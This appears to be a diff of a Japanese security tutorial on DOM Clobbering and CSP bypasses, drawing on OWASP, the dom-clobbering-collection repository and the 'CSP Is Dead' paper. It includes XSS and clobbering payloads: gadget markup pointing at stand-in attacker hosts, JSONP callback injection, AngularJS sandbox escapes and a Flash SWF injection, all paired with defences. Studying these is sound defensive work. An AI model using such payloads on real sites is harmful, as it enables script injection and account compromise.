+<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://attack.hulk/?a="></a>
+
+<!-- MathJax v2 (Accepted, XSS): id重複 + name=root -->
+<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.hulk"></a>
+```
+
+これらはすべて、本節で解説した「HTMLCollection化」「`name`によるメンバーアクセス」「`<a>`の`toString`=`href`」という同一原理の応用です。ペイロードの見た目が違っても、**やっていることは同じ**だと見抜けることが重要です。
+
+#### HTMLインジェクション×サニタイザという別ルート
+
+Collectionはガジェットだけでなく、「ユーザー入力を受け取りHTMLとして出力するが、`id`/`name`属性を残してしまう」ライブラリも列挙しています。注目すべきは、**DOMPurifyを使っていても**該当するケースがある点です。
+
+| ライブラリ | バージョン | サニタイザ | 残る能力 |
+|---|---|---|---|
+| mermaid | v0.1.4 | DOMPurify | 任意の名前付きプロパティ |
+| tui.editor | v3.2.2 | DOMPurify | 任意の名前付きプロパティ |
+| TinyMCE v5/6/7 | v7.3.0 | DOMPurify | 任意の名前付きプロパティ |
+| Froala | v4.2.2 | DOMPurify | 任意の`name`属性 |
+
+**なぜDOMPurifyでも残るのか。** DOMPurifyはデフォルトでは`id`/`name`属性を「無害な属性」として許可します(危険なのはスクリプト実行系だから)。DOM Clobbering対策は**明示的にオプトインしないと効かない**(後述の`SANITIZE_NAMED_PROPS`)ため、既定設定のまま使うとクロバリング用マークアップが通過してしまいます。これはサニタイザ利用者が最も陥りやすい落とし穴です。
+
+Collectionは学術研究とも接続しています。攻撃手法・実態・防御を体系化した論文 "It's (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses"(Soheil Khodayari, Giancarlo Pellegrino)や、記号的DOMモデリングによる動的解析ツールを提案した "The DOMino Effect"(Zhengyu Liu ほか)、教育資料としてDOM Clobbering Wiki(domclob.xyz)やHuliの記事が参照されています。
+
+> 出典: dom-clobbering-collection(jackfromeast / ishmeal)— https://github.com/jackfromeast/dom-clobbering-collection
+
+---
+
+### 防御:OWASP DOM Clobbering Prevention Cheat Sheet
+
+OWASPは防御を「サニタイズ層」「コーディング層」の二段構えで整理しています。単一の銀の弾丸はなく、**多層防御(defense in depth)**が前提です。
+
+#### 防御1:HTMLサニタイズで`id`/`name`を無害化する
+
+最も直接的なのは、注入されるHTMLの`id`/`name`が既存のグローバル/document/フォームのプロパティと衝突しないようにすることです。
+
+**DOMPurify(名前空間隔離):**
+```javascript
+var clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});
+```
+これを有効にすると、DOMPurifyは名前付きプロパティに`user-content-`という接頭辞を付与し、`window.config`のような正規コードの参照とは**別の名前空間**へ隔離します。前述の通り**デフォルトでは無効**なので明示指定が必須です。DOMPurifyの内部では、以下のようなチェックでクロバリングを弾く実装も存在します。
+
+```javascript
+if (SANITIZE_DOM &&
+    (lcName === 'id' || lcName === 'name') &&
+    (value in document || value in formElement)) {
+  return false; // documentやformの既存プロパティ名と衝突する id/name を拒否
 }
 ```
 
-のように期待する型(文字列、プレーンオブジェクトなど)と実際の型を照合することで検出・防御できます。
-- **strictモードの有効化**: 意図しないグローバル変数の暗黙的な生成を防ぎ、読み取り専用プロパティへの代入時に例外を発生させることで、一部のclobbering起因のバグを早期に顕在化させます。
-- **ブラウザの機能検出を先に行う**: 未対応ブラウザでは該当APIが`undefined`のままになるため、そこがclobberingの標的になりやすい。事前にfeature detectionを行い、未定義を前提としたロジックを減らすことが推奨されます。
-- **変数のスコープを可能な限りローカルに限定する**、**カプセル化(クラスやクロージャによるプライベート化)**、**本番環境でのユニークな変数名の採用**も、いずれも「グローバルな名前空間の衝突面」を減らすという同じ原理に基づく対策です。
-
-このチートシートが強調する最も重要な結論は、「名前付きプロパティアクセスの優先順位はブラウザの仕様であり、Webアプリケーション側で変更することはできない」という点です。つまり防御は「衝突が起きないように名前空間を守る」か「衝突が起きても実害が出ないように値を検証する」という**回避戦略**に本質的に依存します。
-
-> 出典: DOM Clobbering Prevention Cheat Sheet (OWASP CheatSheetSeries) — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
-
-### 資料3: DOM Clobbering Collection(研究/ガジェット集)
-
-`jackfromeast/dom-clobbering-collection`は、実際のクライアントサイドライブラリに存在したDOM Clobbering可能な「ガジェット」(clobberingを使って到達可能な、危険なコードパス)と、それに関連するHTMLインジェクション脆弱性を体系的に収集したリポジトリです。研究時点でDOM Clobberingガジェットが35件、関連するHTML Injection脆弱性が12件記録されており、影響を受けたライブラリにはビルドツール(Vite、Webpack、Astro、rollup)、数式レンダリングライブラリ(MathJax v2/v3)、シンタックスハイライトライブラリ(Prism)、Googleの共通ライブラリ(Closure Library)などが含まれます。
-
-代表的なガジェット例:
-
-```html
-<img src="https://attack.example/x" name="currentScript">
+**Sanitizer API(属性ブロック):**
+```javascript
+const sanitizerInstance = new Sanitizer({
+  blockAttributes: [
+    {'name': 'id', elements: '*'},
+    {'name': 'name', elements: '*'}
+  ]
+});
+containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
 ```
+ただしOWASPは、ブラウザ標準のSanitizer APIは**デフォルト状態ではDOM Clobberingを防がない**と明記しています。`id`/`name`を明示的にブロックする設定を自分で加える必要があります。
 
-> なぜ動くか: 一部のビルドツールが生成するランタイムコードは、現在実行中の`<script>`要素の情報を`document.currentScript`から取得してモジュール解決の基準パスを決めることがある。しかし`currentScript`もまた名前付きプロパティの対象になりうる名前であり、ページ内に`name="currentScript"`を持つ`<img>`などの要素が存在すると、`document.currentScript`がその偽の要素にclobberされ、ライブラリが本来のスクリプトタグではなく攻撃者の`src`情報を「現在のスクリプト」として誤認してしまう。これによりモジュールの読み込み元パスが操作可能になる。
+#### 防御2:CSP(部分的緩和にとどまる)
 
-```html
-<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>
+`script-src`でスクリプトの実行元を厳格に制限すれば、「攻撃者URLからのスクリプトロード」型のガジェット(`currentScript`型など)は緩和できます。ただしOWASPは、CSPは**一部の変種しか防げない**と釘を刺します。AMP4Email事例が示すように、CSPは最後の砦にはなり得ますが、`location.assign`への`javascript:`注入やCSRF型など、スクリプトを新たにロードしない攻撃には無力なこともあります。
+
+#### 防御3:オブジェクトの凍結
+
+```javascript
+Object.freeze(sensitiveObject);
 ```
+`Object.freeze`した後は、そのオブジェクトのプロパティを名前付きプロパティで上書きできなくなります。ただし「守るべきオブジェクトを漏れなく列挙する」のは現実には困難、とOWASPは補足しています。
 
-> なぜ動くか: 同名の`<form>`要素を複数配置すると、`document.scripts`(本来はページ内の`<script>`要素一覧を返す組み込みのライブコレクション)が、名前付きプロパティの解決順位により`HTMLCollection`(自作フォーム集合)にすり替わる。ライブラリが「`document.scripts`は常にScript要素のコレクションだ」と無条件に信じて反復処理などを行っていると、意図しないオブジェクトを処理させられ、ロジックの破綻や後続のXSSにつながる。
+#### 防御4〜13:安全なコーディング規約
 
-```html
-<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.example"></a>
-```
+サニタイザに頼りきらず、**そもそもクロバリングされない書き方**をすることが根本対策です。OWASPの主要項目を要約します。
 
-> なぜ動くか: MathJaxは初期化時にグローバルな`MathJax`オブジェクト(設定やルートパスを保持)を参照するが、これも変数名の衝突対象になる。`id`が重複した`<a>`要素で`HTMLCollection`を作り、その中の`name="root"`要素で`.root`プロパティを持たせることで、MathJaxが期待する「設定オブジェクトの`root`プロパティ(スクリプトの読み込みベースパス)」を攻撃者のURLにすり替え、任意のリモートスクリプトを読み込ませることができる。
+- **明示的な変数宣言(#5):** `let redirectTo = '/profile/'` のように、必ず初期値を持つローカル/明示変数を使う。`window.x || default` の「未定義前提」を避ける。
+- **document/windowを変数置き場にしない(#6):** アプリの状態をグローバルに載せない。
+- **使用前の型チェック(#7, #8):** 名前付きプロパティは常にHTML要素として現れるので、要素かどうかで弾ける。
+  ```javascript
+  if (typeof window.config === 'object' && window.config instanceof Object) {
+    // 安全に使用可
+  }
+  // あるいは
+  let src = (window.config instanceof Object && window.config.url)
+    ? window.config.url
+    : 'script.js';
+  ```
+  **なぜ有効か。** クロバリングで注入されるのは`HTMLElement`/`HTMLCollection`です。期待するのが「プレーンなオブジェクト」なら`instanceof`や厳密な型判定でHTML要素を除外できます(ただし要素も`instanceof Object`は真になるため、`instanceof HTMLElement`で明示的に**拒否**する方が確実な場面もあります)。
+- **strictモード(#9):** `'use strict'` で暗黙のグローバル生成を禁止し、読み取り専用への代入をエラーにする。
+- **フィーチャ検出(#10)/ローカルスコープ優先(#11)/ユニークな変数名(#12):** `__appConfig__`のような衝突しにくい名前や、クロージャによるカプセル化(#13)で露出面を減らす。
+  ```javascript
+  const AppConfig = (() => {
+    const config = {url: 'script.js'};
+    return { getUrl: () => config.url };
+  })();
+  ```
+  **なぜ有効か。** クロージャ内のローカル変数は`window`/`document`のプロパティにならないため、名前付きプロパティで到達できません。
 
-このリポジトリが示す実務上の教訓は次の3点に整理できます。
+> 出典: DOM Clobbering Prevention Cheat Sheet(OWASP)— https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
 
-1. **影響の多くはXSS(30件超)だが、CSRFも一定数観測されている**(plausible-analyticsやplotly.jsなど)。これはDOM Clobberingが「JavaScriptの意思決定ロジックを狂わせる」攻撃全般に応用可能であり、XSSに限定されないことを示します。
-2. **多くのケースで根本原因はライブラリ側の「グローバル状態への暗黙の依存」**であり、mermaidやtui.editorのように、事後的にDOMPurifyのようなサニタイザを組み込むことで修正されています。
-3. **一部のライブラリ(plausible-analytics、plotly.js、Prismなど)は報告後も未修正のまま**とされており、DOM Clobberingは「理論上は昔から知られているが、実際のライブラリでの対策は依然として発展途上」という現在進行形の脅威であることが読み取れます。
+---
 
-> 出典: dom-clobbering-collection — https://github.com/jackfromeast/dom-clobbering-collection
+### まとめ:攻撃者・防御者それぞれの視点
 
-### まとめ
+DOM Clobberingの本質は、「HTMLとJavaScriptが`window`/`document`の名前付きプロパティを通じて**意図せず接続している**」という、ブラウザの後方互換仕様にあります。攻撃者にとっての着眼点は3つです。
 
-DOM Clobberingは、スクリプトの実行そのものを禁止するサニタイザやCSPだけでは防ぎきれない、**ブラウザの名前付きプロパティ解決という仕様レベルの挙動**を悪用する攻撃です。攻撃者はHTMLタグの`id`/`name`属性という一見無害な入力だけで、JavaScriptが信頼している変数・組み込みAPI・設定オブジェクトのプロパティをすり替え、最終的にはスクリプトの動的ロードやURLベースのsinkを通じてXSSやCSRFに到達させます。Gmail AMP4Emailの事例が示すように、ブロックリスト方式のフィルタは内部実装の全体像を把握しない限り漏れが生じやすく、防御側は「名前空間の汚染を防ぐ」(サニタイザでの属性値変形、命名規則の統一)と「値を使う前に型を検証する」(`instanceof`によるチェック)の両輪で対策する必要があります。
+1. **`id`/`name`が通るHTMLインジェクション点**があるか(サニタイザのデフォルト設定が甘くないか)。
+2. 正規コードが**未定義前提のグローバル/設定オブジェクト**(`window.config`, `AMP_MODE`, `document.currentScript`等)を参照していないか。
+3. その値が**危険なsink**(`script.src`, `location`, `innerHTML`)へ流れていないか。
+
+防御者は逆に、この3点のいずれかを断ちます。サニタイザで`SANITIZE_NAMED_PROPS`を有効化し、`window.x || default`のような書き方を排し、設定はクロージャに閉じ込め、CSPを最後の砦に置く――どれか一つではなく、**すべてを重ねる**ことが、Gmail級の堅牢な環境ですら破られた歴史から得られる教訓です。
 
 ---
 
 ## CSPの限界（CSP Is Dead 論文）
 
-CSP（Content Security Policy、コンテンツセキュリティポリシー）は、ブラウザにHTTPレスポンスヘッダとして「どのオリジンからスクリプトを読み込んでよいか」を宣言することで、反射型・格納型を問わずXSSの実行を防ぐ目的で設計された多層防御機構である。しかし2016年、Googleのセキュリティチーム（Lukas Weichselbaum, Michele Spagnuolo, Sebastian Lekies, Artur Janc）が発表した論文 **"CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"**（ACM CCS 2016）は、実運用されているCSPの**94.72%が回避可能**であることを大規模実測で示し、業界に衝撃を与えた。本節では、なぜホワイトリスト方式のCSPが機能しないのか、その仕組み上の理由と、代替として提案された「strict CSP（nonceベースCSP）」の設計原理を学ぶ。
+XSS対策として広く推奨されてきた **CSP（Content Security Policy／コンテンツセキュリティポリシー）** は、「ブラウザに許可リストを宣言し、リストにないスクリプトの実行を拒否させる」多層防御(defense-in-depth)の仕組みです。ところが2016年、Googleのセキュリティチーム（Lukas Weichselbaum、Michele Spagnuolo、Sebastian Lekies、Artur Janc）がACM CCS 2016で発表した論文 **"CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"** は、実際にインターネット上で配信されているCSPポリシーのうち **94.72% が自明に回避可能(trivially bypassable)** であることを、Google検索インデックスを使った大規模実測によって示しました。
 
-### CSPの基本的な考え方（前提の整理）
+本節では、この論文と、同じ著者の一人LukasがDeepSec 2016で行った講演スライド「CSP Is Dead, Long Live Strict CSP!」を主資料として、(1) CSPの脅威モデルの正確な理解、(2) ホワイトリスト方式が構造的に破綻する仕組み、(3) その代替として提案された `'strict-dynamic'` を伴うnonceベースCSP（strict CSP）の設計原理、を順に解説します。読者はこの節を読むことで「CSPがあるからXSSは無害化されている」という前提がなぜ多くの場合に成り立たないのかを、仕組みのレベルで説明できるようになります。
 
-CSPは以下のようなヘッダで配信される。
+### 前提：CSPは何を守り、何を守らないのか
+
+CSPは `Content-Security-Policy` HTTPレスポンスヘッダ（違反を記録するだけの `Content-Security-Policy-Report-Only` ヘッダ、または `<meta>` 要素）で配信されます。論文はCSPの機能を3つに分類しています。
+
+1. **リソース読み込み制限**: `script-src` / `style-src` / `img-src` / 包括的な `default-src` などのディレクティブで、サブリソースの取得元を「ソースリスト（source list、通称ホワイトリスト）」に限定する。
+2. **URLベースの補助的制限**: `frame-ancestors`（クリックジャッキング対策）、`base-uri` と `form-action`（`<base href>` や `<form action>` を悪用するpost-XSS攻撃の緩和）。
+3. **その他の封じ込め・堅牢化オプション**: `block-all-mixed-content`、`upgrade-insecure-requests`、`plugin-types`、`sandbox`。
+
+論文のTable 1に挙げられたディレクティブ一覧は `default-src` / `script-src` / `style-src` / `img-src` / `media-src` / `font-src` / `frame-src` / `object-src` / `child-src` / `worker-src` / `manifest-src` です。
+
+重要なのは **脅威モデル** です。論文によればCSPが防げるのはXSS・クリックジャッキング・混在コンテンツ(mixed content)の3種類だけで、しかも「クリックジャッキングは `X-Frame-Options` でほぼ防げており、能動的な混在コンテンツは最近のブラウザが既定でブロックしている」ため、**CSPの実質的な価値はXSS緩和にほぼ集約される**、と結論づけています。そしてXSSを防ぐのは `script-src` と `object-src`（両者が無ければ `default-src`）だけです。
+
+さらに決定的な非対称性があります。
+
+> スクリプトを実行できる攻撃者は、他のすべてのディレクティブの制限を回避できる。
+
+つまり `img-src` や `frame-ancestors` をどれだけ厳しくしても、`script-src` が破られた瞬間にすべて無意味になります。逆に言えば、CSPの評価は「script実行を止められているか」の一点で決まります。
+
+#### script-srcにおける4つの許可方式
+
+ソースリストにはホスト名（`example.org`）、サブドメインを含めるワイルドカード（`*.example.org`）、スキーム（`https:`、`data:`）、そして特殊キーワード `'self'`（現在のドキュメントのオリジン）と `'none'`（空のリスト）を書けます。CSP2以降はパス（`example.org/resources/js/`）も指定できます。加えて `script-src` には以下の4つの制御があります。
+
+1. `'unsafe-inline'` — インライン `<script>` ブロックとイベントハンドラ属性を許可する（**XSS対策としてのCSPを事実上無効化する**）。
+2. `'unsafe-eval'` — `eval()`、`setTimeout()`、`setInterval()`、`Function` コンストラクタなど、文字列をコードとして実行するAPIを許可する。
+3. **nonce** — `script-src 'nonce-random-value'` と書き、ページ内の `<script nonce="random-value">` だけを実行許可する一回限りのトークン。
+4. **hash** — `script-src 'sha256-nGA...'` のように、期待するインラインスクリプトの暗号学的ハッシュを列挙する。
+
+論文が例示する「ロックダウンされたポリシー」（Listing 2）は次の形です。
 
 ```
-Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com https://www.google.com
+Content-Security-Policy: script-src 'nonce-BPNLMA4' 'sha256-OPc+f+ieuYDM...' object-src 'none';
 ```
 
-ブラウザは、HTMLをパース中にスクリプトタグやインラインスクリプトの実行要求に遭遇するたびに、そのスクリプトの「ソース（読み込み元URL、あるいはインラインかどうか）」を`script-src`ディレクティブの許可リスト（ホワイトリスト）と照合する。一致しなければブロックし、コンソールに違反ログを出す。これにより、攻撃者が`<script>alert(1)</script>`のような任意のインラインスクリプトを注入できても、CSPが`'unsafe-inline'`を許可していなければ実行されない、というのが素朴な期待である。
+#### 安全なポリシーが満たすべき3条件
 
-この「ホワイトリスト方式」は直感的でわかりやすいが、論文が指摘したのは、**実際のWebサイトが必要とする外部スクリプトの多くが、それ自体XSSに悪用可能な「JSONPエンドポイント」や「古いライブラリバージョン」を抱えている**という現実である。
+論文は「スクリプト実行を防ぐ」ために必要な条件を3つ挙げ、それぞれに対応するバイパス例（Listing 3〜5）を示しています。
 
-### なぜホワイトリストは機能しないか：仕組みレベルの説明
+**条件1: `script-src` と `object-src` の両方（または `default-src`）を定義していること。**
 
-論文はGoogleの検索エンジンインデックス（約1000億ページ、10億ホストの規模）を使い、CSPを配信している168万ホスト・26,011個のユニークなポリシーを収集して自動解析した。その結果、94.72%のポリシーがバイパス可能と判定された。バイパスの主な原因は次の3種類に整理できる。
+```html
+<script src="//evil.com"></script>
 
-#### 1. ホワイトリストに含まれるドメインの「脇道」の悪用
+<object data="//evil.com/evil.swf">
+  <param name="allowscriptaccess" value="always">
+</object>
+```
 
-CSPは**オリジン（プロトコル+ホスト+ポート）単位**でしか許可・拒否を判定できず、そのオリジン配下のどのパス・どのファイルが安全かまでは検証しない。したがって、`script-src https://www.google.com`のように大手CDNやプラットフォームのドメインをまるごと許可すると、そのドメイン配下にたまたま存在する以下のようなリソースが「合法な攻撃経路」になる。
+> なぜ動くか: `script-src` だけを書いて `object-src` も `default-src` も書かないと、プラグイン系リソースは無制限になります。Adobe Flashのようなプラグインは埋め込み元ページのコンテキストでJavaScriptを実行できる（`allowscriptaccess=always`）ため、`<object>` 経由で任意スクリプト実行に到達します。DeepSecスライドはこの具体例として、Googleのホストに置かれた実在のYUIチャート用SWFを使うペイロードを示しています。
+>
+> ```html
+> ">'><object type="application/x-shockwave-flash"
+> data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//'>
+> <param name="AllowScriptAccess" value="always"></object>
+> ```
+>
+> `allowedDomain` パラメータの値がSWF内部で生成されるJavaScriptコードに埋め込まれるため、`\"})))}catch(e){...}//` という文字列でその構文を脱出し、任意のJSを実行できます。
 
-- **JSONPエンドポイント**：`https://accounts.google.com/o/oauth2/revoke?callback=alert(1)`のように、クエリパラメータの値をそのままJavaScriptとして実行するcallback系API。CSPの`script-src`は「そのオリジンから読み込まれたスクリプト」を許可しているだけなので、攻撃者がその許可オリジン上のJSONPエンドポイントを見つけてcallback引数に任意コードを注入すれば、CSPを一切迂回せずに任意JS実行が成立する。
-- **アップロード機能を持つエンドポイント**：ユーザーがファイル（JSやHTMLとして解釈されうるファイル）をアップロードできる、許可済みドメイン上の機能（例：`docs.google.com`のようなオフィス系サービスや、掲示板・CMSのアバターアップロード機能）。
-- **古いライブラリバージョンの温存**：`ajax.googleapis.com`や`cdnjs.cloudflare.com`のような公開CDNをまるごと許可すると、攻撃者はそのCDNがホストする「脆弱なバージョンの古いAngularJS」等を`<script>`で読み込ませることができる。AngularJSの一部バージョンには、テンプレートインジェクション経由でサンドボックスを脱出しCSPをすり抜けて任意コードを実行できる既知の脆弱性があり（例：AngularJS 1.6系まで存在した`{{constructor.constructor('alert(1)')()}}`系のサンドボックス回避）、CSPが「AngularJSの配布元ドメイン」を許可している場合、攻撃者はそのドメインから脆弱バージョンを読み込むだけでCSPの許可リストの内側から攻撃を完結できる。
+**条件2: `script-src` に（nonceを伴わない）`'unsafe-inline'` や `data:` URIを含めないこと。**
 
-これらはいずれも「ドメイン単位の許可」という設計そのものに起因する。CSPの評価アルゴリズムはURLのオリジン部分しか見ないため、パス以下にどんな機能があるかは一切考慮しない。**任意のJSライブラリを許可オリジン配下でホスト可能な仕組み（アップロード、オープンリダイレクト、JSONP、ファイル共有）が1つでも存在すれば、そのドメインを許可した時点でCSPは事実上無効化される**。論文はこのような「バイパス可能なホスト」を大量にリスト化し、Google自身のドメインを含む主要CDN・クラウドサービスの多くがこれに該当することを示した。
+```html
+<img src="x" onerror="evil()">
 
-#### 2. `'unsafe-inline'`と`'unsafe-eval'`の常態的な使用
+<script src="data:text/javascript,evil()"></script>
+```
 
-移行コストの問題から、多くのサイトは`script-src 'self' 'unsafe-inline'`のように`'unsafe-inline'`を付けたままCSPを運用していた。`'unsafe-inline'`が付いている場合、CSPは実質的に「インラインスクリプト注入を防ぐ」という最も基本的な役割さえ果たせない。反射型XSSで`<script>`タグを注入できるなら、CSPの有無に関わらず実行されてしまう。論文の統計では、多数の実運用ポリシーがこの状態にあり、CSPが「あるのに機能していない」典型例だった。
+> なぜ動くか: `'unsafe-inline'` はインラインイベントハンドラ（`onerror=`）を許可するため、注入されたマークアップだけでコードが動きます。`data:` を許可すると、スクリプト本体をURL内に直接埋め込めるので、外部ホストを一切必要とせずに任意コードを読み込めます。DeepSecスライドの `script-src 'self' https: data: *;` はこの両方に該当し、`<script src=https://attacker.com/evil.js>` も `<script src=data:text/javascript,alert(1337)>` も通ります。
 
-#### 3. 複雑なポリシー構文の誤設定
+**条件3: `script-src` / `object-src` のソースリストに、レスポンスの「セキュリティ上重要な部分」を攻撃者が制御できるエンドポイントや、危険なライブラリを含めないこと。**
 
-`script-src`を指定し忘れて`default-src`だけに頼っている、ワイルドカード（`*`）を安易に使っている、あるいは`https:`のようなスキームだけを許可してあらゆるHTTPSオリジンを許可してしまっている、といった設定ミスも多数観測された。`script-src https:`は「HTTPSであれば任意のドメイン」を許可するため、上記のJSONP/アップロード型バイパスの標的が実質無限に広がる。
+```html
+<script src="/api/jsonp?callback=evil"></script>
+
+<script src="angular.js"></script> <div ng-app>
+{{ executeEvilCodeInUnsafeSandbox() }} </div>
+```
+
+この条件3こそが、論文の核心である「ホワイトリストは維持不可能」という主張につながります。
 
 > 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/
 
-> ⚠️ **未取得の資料**: 「CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy（research.google 掲載版）」は自動取得できませんでした（理由: 実行環境のegressプロキシにより research.google ドメインへのアクセスがブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/
+### ホワイトリストが壊れる4つの仕組み
+
+論文の2.3節は、CSPの暗黙の前提である「ホワイトリストに載せたドメインは安全なコンテンツしか配信しない」が、現実のWebアプリケーションの一般的な実装パターンによって破られることを示します。
+
+#### (1) ユーザ制御のコールバックを持つJavaScript（JSONP）
+
+JSONPは、APIのJSONデータをコールバック関数でラップして返し、`<script>` として読み込ませる古典的なクロスオリジン通信手法です。論文Listing 6:
+
+```html
+<script src="/path/jsonp?callback=alert(document.domain)//"></script>
+```
+
+サーバが返すレスポンス:
+
+```js
+/* API response */
+alert(document.domain);//{"var": "data", ...});
+```
+
+> なぜ動くか: `callback` パラメータの値がレスポンス先頭にそのまま展開され、それがJavaScriptとしてパースされます。攻撃者はコールバック名の位置に `alert(document.domain);//` のような「関数呼び出し＋行コメント」を差し込むことで、後続のJSON部分を無効化しつつ任意のコードを実行できます。CSPから見れば、このスクリプトは**ホワイトリストに載っている正規ドメインから読み込まれている**ので、何も違反していません。
+
+制御できる文字が制限され関数名しか指定できない場合でも、**SOME（Same Origin Method Execution）** 攻撃により、ページ内の既存の任意関数（`x.click` など）を呼び出せるため、実務上は完全なXSSと同等に危険であると論文は述べています。実測では **JSONPバイパスの39%が任意のJS実行を許し、残りはSOME攻撃が可能** でした。
+
+DeepSecスライドの図解は挙動を端的に示します。
+
+```
+">'><script src="https://whitelisted.com/jsonp?callback= alert(1);u">
+  → レスポンス: alert(1);u({...})            ← 完全なJS実行
+
+">'><script src="https://whitelisted.com/jsonp?callback= x.click">
+  → レスポンス: x.click({...})               ← SOME攻撃
+```
+
+スライドの教訓は「**JSONPエンドポイントをホワイトリストに載せてはいけない。しかし世の中には大量に存在する — 特にCDNに**」です。
+
+#### (2) リフレクション／シンボリック実行によるJSガジェット
+
+ホワイトリストされたオリジンにある「協力的なスクリプト」が、意図せずCSPを回避させてしまうケースです。論文Listing 7:
+
+```js
+// Can be used to invoke window.* functions with
+// arbitrary arguments via markup such as:
+// <input id="cmd" value="alert,safe string">
+var array =
+  document.getElementById('cmd').value.split(',');
+window[array[0]].apply(this, array.slice(1));
+```
+
+> なぜ動くか: このコード自体は「開発者が用意したDOM要素の値で関数を呼ぶ」だけで、単体では脆弱性ではありません。問題は、マークアップ注入のバグがあるアプリでこのスクリプトが読み込まれると、攻撃者が `id="cmd"` を持つ要素を注入することで `window[...]` に任意の関数名と引数を渡せる点です。スクリプト本体は正規のホワイトリストされたドメインから来ているため、CSPは一切ブロックしません。
+
+最も影響が大きい実例が **AngularJS** です。論文Listing 8:
+
+```html
+<script src="whitelisted.com/angular.js"></script>
+<div ng-app>{{ 1000 - 1 }}</div>
+```
+
+AngularJSはページ内の指定領域をテンプレートとしてパースし評価します。既定では `eval()` を使うため `'unsafe-eval'` のないCSPでは止まりますが、AngularJSには **「CSP互換モード」(`ng-csp`)** が用意されており、このモードでは式をシンボリック実行（インタプリタ的に評価）するため、**`'unsafe-eval'` なしでも任意のJavaScript相当の処理が可能**になります。DeepSecスライドの具体ペイロード:
+
+```html
+"><script src="https://whitelisted.com/angular.min.js"></script>
+<div ng-app ng-csp>{{1336 + 1}}</div>
+
+"><script src="https://whitelisted.com/angularjs/1.1.3/angular.min.js"></script>
+<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+```
+
+> なぜ動くか: 1つ目は式評価が生きていることの確認（`1337` が表示される）。2つ目はAngularJS 1.1.3という**サンドボックスバイパスが知られた旧バージョン**を狙い、`$event.view` からグローバルの `window` を取り出して `alert` を呼びます。`ng-click` はユーザ操作が必要ですが、スライドは「JSONPエンドポイントや他のJSライブラリと組み合わせればユーザ操作なしでも動く」と注記しています。
 >
-> （以下は未取得資料の補足として、Web検索で得られた公開情報および一般知識に基づく解説です）論文本体はACM CCS 2016（Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security）に採録され、著者はLukas Weichselbaum、Michele Spagnuolo、Sebastian Lekies、Artur Jancの4名（いずれもGoogleのセキュリティチーム）。調査対象はおよそ1000億ページ・10億ホスト規模の検索インデックスから抽出した168万ホスト・26,011件のユニークCSPポリシーであり、これは当時「最大規模のCSP実測調査」と位置づけられた。中心的な結論は「ホワイトリスト方式のCSPは94.72%のケースでバイパス可能」というものであり、この結果を受けて論文はホワイトリストに依存しない新しいCSPの書き方として、CSP Level 3で標準化された`'strict-dynamic'`キーワードの採用を提案している。
+> さらに強力な組み合わせとして、古いPrototype.jsを併用する例が示されています。
+>
+> ```html
+> <script src="//whitelisted.com/angular.js"></script>
+> <script src="//whitelisted.com/prototype.js"></script>
+> <div ng-app ng-csp>{{$on.curry.call().alert(1)}}</div>
+> ```
+>
+> Prototype.jsが `Function.prototype.curry` を定義しているため、AngularJSのサンドボックス内から `curry.call()` を経由して `this` がグローバルオブジェクト（`window`）になったコンテキストを獲得でき、`alert` に到達します。
 
-### 代替アプローチ：nonceベースの「strict CSP」
+決定的なのは、**攻撃対象のアプリがAngularJSを一切使っていなくても、ホワイトリストされたドメインのどこかにAngularJSが置いてあるだけでCSPが無効化される**という点です。論文の表現では「trusted domainにAngularライブラリが存在するだけで、CSPが提供する保護は覆される」。
 
-論文が提案し、その後Googleが`strict-csp`として一般に啓発した設計は、「ドメインを信頼する」のではなく「個々のスクリプトを信頼する」という発想の転換に基づく。具体的な推奨ポリシーは次の形を取る。
+#### (3) 意図せずJavaScriptとしてパースできてしまうレスポンス
+
+ブラウザは互換性のため、レスポンスのMIMEタイプと利用コンテキストの一致を厳密に検査しません。したがって **「構文エラーなくJavaScriptとしてパースでき、かつ攻撃者制御のデータが最初の実行時エラーより前に現れる」レスポンスはすべてスクリプトになりえます**。論文が挙げる類型:
+
+```
+Name,Value
+alert(1),234
+```
+
+```
+Error: alert(1)// not found.
+```
+
+- 攻撃者が一部を制御できるCSV（カンマ区切り）データ
+- リクエストパラメータをそのまま含むエラーメッセージ
+- **ユーザのファイルアップロード**（たとえHTMLエスケープ／サニタイズ済みでも）
+
+> なぜ動くか: `alert(1),234` はJavaScriptとしては「`alert(1)` を評価し、カンマ演算子で `234` を評価する」有効な式文です。`Name,Value` の行で `Name` と `Value` は未定義変数参照となり得ますが、パース自体は通り、実行時エラーが起きる前に `alert(1)` が到達すれば攻撃は成立します。
+
+DeepSecスライドは、この帰結として `script-src 'self'` と**同一オリジンでのユーザコンテンツ配信**の組み合わせが危険であることを強調します。
+
+```html
+">'><script src="/user_upload/evil_cat.jpg.js"></script>
+```
+
+同様に、`object-src` のホワイトリスト先にFlashとして解釈されるファイルをアップロードできれば、そこからスクリプト実行が可能です。
+
